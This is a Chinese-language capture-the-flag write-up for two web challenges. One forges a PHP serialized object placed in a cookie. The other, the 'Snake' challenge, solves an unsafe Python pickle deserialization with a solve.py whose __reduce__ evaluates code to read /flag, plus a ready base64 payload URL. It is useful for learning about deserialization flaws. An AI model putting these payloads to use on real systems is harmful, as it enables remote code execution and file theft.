那這些看不見的字元自然不能被手動複製貼上，那怎麼辦哩？ ... 既然是由程式產生的，那就寫回去ㄚ。
可以直接照搬上面的產生serialize的程式碼，再將原本token產生的方式改成array即可！

{% codeblock lang:php %}
<?php

class User {
    public $name;
    private $token;

    function __construct($name) {
        $this->name = $name;
        $this->token = array();
    }
}

$user = new User("haha");
echo base64_encode(serialize($user));
{% endcodeblock %}

用PHP online之類的執行完就能把拿到的base64 code貼回去cookies，重新整理頁面拿flag ~

### 🐍 Snake (Post-solved, 272 points, 137 solves)

#### Description

點開連結，題目直接把code以純文字顯示在頁面上。

{% codeblock lang:python %}
from flask import Flask, Response, request
import pickle, base64, traceback

Response.default_mimetype = 'text/plain'

app = Flask(__name__)

@app.route("/")
def index():
    data = request.values.get('data')

    if data is not None:
        try:
            data = base64.b64decode(data)
            data = pickle.loads(data)

            if data and not data:
                return open('/flag').read()

            return str(data)
        except:
            return traceback.format_exc()

    return open(__file__).read()
{% endcodeblock %}

#### Solution

簡單瞭解這份code:
- line 10 表示我們可以透過後綴`/?data=`接一些字串
- line 14 表示字串必須為base64格式
- line 15 pickle ... ? 原來是肚子餓的部分（X）

![ ](https://github.com/yctseng1227/AIS3_2020_pre-exam/blob/master/web/web-sn01.png?raw=true)

- line 17 永遠不可能成立的條件


用Google搜尋 "pickle ctf" 可以找到不少資料，可以參考這篇 [pickle反序列化初探](https://xz.aliyun.com/t/7436)。

簡單講`pickle`是python用來**序列化**及**反序列化**的 Python library。
當我們透過網址傳送序列化字串後，Server端會執行反序列化並執行物件中的`__reduce__`，因此我們這次將`__reduce__`內容設計成**system read /flag file**，Server回傳的就會是flag的內容，另外要注意的是回傳格式(callable, `tuple`)，後者的參數會交給前者執行。

{% codeblock solve.py lang:python %}
import pickle
import base64

class test(object):
    def __reduce__(self):
        return( eval, ("open('/flag').read()",) )

print(base64.b64encode(pickle.dumps(test())))
{% endcodeblock %}

剩下就是把產生出來的base64 code丟到網址後綴拿flag ~ 
`/?data=Y19fYnVpbHRpbl9fCmV2YWwKcDAKKFMib3BlbignL2ZsYWcnKS5yZWFkKCkiCnAxCnRwMgpScDMKLg==`

<!--
### 🦉 Owl (Unsolved, 492 points, 27 solves)

### 🦏 Rhino (Unsolved, 494 points, 24 solves)

-->

## Scoreboard
![ ](https://github.com/yctseng1227/AIS3_2020_pre-exam/blob/master/pre-exam.ais3.org_scoreboard.png?raw=true)